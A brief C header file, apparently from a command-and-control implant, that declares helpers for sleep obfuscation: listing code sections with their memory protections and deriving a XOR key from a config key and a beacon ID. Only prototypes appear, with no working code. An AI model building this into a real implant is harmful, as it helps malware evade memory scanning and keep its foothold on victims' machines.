#pragma once
#include "resolver.h"
#include <stdint.h>

#define SLEEP_XOR_KEY_LENGTH  1024

typedef struct {
    PVOID  base;
    SIZE_T size;
    ULONG  oldProtect;
} SleepSectionInfo;

int enumerateCodeSections(PVOID imageBase, SleepSectionInfo* sections, int maxSections);

void deriveXorKey(uint8_t out[SLEEP_XOR_KEY_LENGTH], const uint8_t configKey[32], const uint8_t beaconId[8]);
